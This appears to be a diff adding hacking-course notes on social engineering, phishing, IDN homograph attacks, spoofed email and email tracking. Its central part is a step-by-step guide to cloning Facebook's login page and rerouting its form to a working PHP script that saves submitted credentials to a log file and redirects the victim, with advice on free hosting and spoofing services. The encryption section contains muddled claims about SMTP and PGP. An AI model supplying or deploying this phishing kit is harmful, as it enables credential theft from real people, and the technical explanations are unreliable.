@@ -1,0 +1,166 @@
+                  SESSION 8
+
+SOCIAL ENGINEERING
+==================
+Social Engineering is a term usually called for “Hacking done via Human Minds”.
+This is an art of Manipulating human minds so that they can spit out the Confidential Information. These types of Information can be any Personal or Financial Information. This attack can only be possible through “Human Stupidity”.
+Phishing is a sub-category of Social Engineering.
+This step plays a very crucial role in Information gathering as you can acquire information from the victim which will later help an attacker to form a dictionary from the victim's interest and apply a brute force on places.
+
+
+Example: https://www.youtube.com/watch?v=lc7scxvKQOo
+To gain more knowledge one can follow KEVIN MITTNICK .
+
+
+
+								PHISHING ATTACKS
+								================
+An attack where attacker forms a fake page of a genuine website which seems ok or legit to a victim and enters the credentials such as user name , password , phone no. etc.There are basically two types of phishing .
+    1. Spear Phishing
+	2. Vector Phishing | Credential Harvestor
+
+1. Spear Phishing
+-----------------
+	Targeting a single or an individual or the crowd of people having common interest. Target Specific.
+
+2. Credential Harvestor
+-----------------------
+	It is not target specific. Any kind of person can come and enter their credentials. I just need to collect the credentials of the crowd for my own purpose.
+
+CREATION OF A PHISHING WEBPAGE
+===============================
+Workflow:
+= Opening any Social Networking Website and copy its Source Code - The Scripting Code of the Web Page.
+= Creating a PHP Page for getting the Data from the Phishing Page.
+= A text file to store the data of the Phishing page.
+
+
+Steps :
+=======
+1. Open Your Browser
+2. Goto www.facebook.com (or any other website through which you want to attack a victim)
+3. Right Click on the login page ---> view page source
+4. Select all ---> copy
+5. Open notepad and paste the whole code
+6. Scroll to the very top of the code.
+7. Ctrl+F ---> action=
+	action="https://www.facebook.com/login.php?login_attempt=1&amp;lwv=110"
+8. In the received parameter
+	https://www.facebook.com/login.php?login_attempt=1&amp;lwv=110
+	Replace it with "anyname.php" 
+
+
+* Note : the name you redirect your phishing page will be same as the php code which will be receiving it as on pressing the action button the button will be rediricting you to a page that will perform the task of storing the credentials entered.
+
+Creation of anymane.php
+=====================
+<?php        //starting of a php code
+header ('Location: https://www.facebook.com');        //redirection to the original webpage 
+$handle = fopen("log.txt", "a");        //Creating a text file log.txt to store data & append it
+foreach($_POST as $variable => $value) {            //running of a loop until  we didn’t get the value
+   fwrite($handle, $variable);        //Writing the Variable Name
+   fwrite($handle, "=");        //To define the value of Equals to.
+   fwrite($handle, $value);        //For writing the Username of the data
+   fwrite($handle, "\r\n");        //For creating a New Line and Returning the value
+}        // end of loop
+fwrite($handle, "\r\n");        //For creating a New Line and Returning the value
+fclose($handle);        //saving and closing the file named log.txt
+exit;        // Exiting the PHP code
+?>        // End of the PHP Code
+
+
+Saving the Web Phishing Code and the anyname.php in a same location in a folder inside the Localhost server.
+
+These Phishing Pages can be globally hosted via 000webhost.com or My3gb.com or any other webhosting websites.
+----------------------------------------------------------------------
+
+ 
+Email Encryption
+=============
+What is encryption? 
+Encryption is a Method which converts Plain Text Data which can be readable and understand into a unreadable form of data which is Encoded and cannot be easily readable by humans.
+
+
+					 Encryption
+					 -----------
+(plain text)prabhankar > +1 > qsbcibolbs (cipher text)
+						  |
+					encryption key
+
+					  Decryption
+					  -----------
+(cipher) qsbcibolbs > -1 > prabhankar (plain text)					  
+                       |
+                     Decrytion key
+
+
+Email Encryption : When we use the service of SMTP and sends a Email to another person, it uses End to End Encryption Method which is having some Public Key, Private Key and some Algorithms.
+
+PGP - Pretty Good Privacy
+====================
+Pretty Good Privacy or PGP is a popular program used to encrypt and decrypt email over the Internet, as well as authenticate messages with digital signatures and encrypted stored files. This encryption format developed by PGP is used by Emails and applications like Whatsapp nowadays which provides end to end security.
+
+Website -  https://encipher.it/
+
+
+IDN Homograph Attack
+=================
+
+A IDN homograph attack is based on standards of modern Internet that allows us to communicate in various multiple languages provided all over the globe. Different languages may contain different but very similar characters. So a Attacker lures and pranks with a Victim by these languages. Eg of Languages - Cyrillic Characters.
+
+
+What IDN homograph can do?
+=============================
+Attackers can register their own domain names that are similar to the existing web addresses. 
+Then they can create their own websites that are, again, the same or very similar to the existing original sites (that usually belong to banks, corporations, email or news services).
+
+
+
+
+Fake Emails
+=========
+A fake email means a email generated by fake dummy server from which a attacker can generate there email and customize it to lure and attracts a Victim for Spear Phishing and other activities.
+
+Website - https://emkei.cz/
+		  guirellamail.com
+
+Note: One could create a fake mailing script in php and could upload it in a free webhosting service which will help them to send fake mails and through which one can spoof anyone.
+
+----------------------------------------------------------------------
+Emails Tracing and Tracking
+=====================
+Demo of whoreadme.com
+Demo of IP Grabber
+http://www.fuglekos.com/ip-grabber/index.html
+https://grabify.link/
+
+
+Chrome extension : Mailtrack -> helps you getting the info. when a person has opened your email or even has read it or not.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
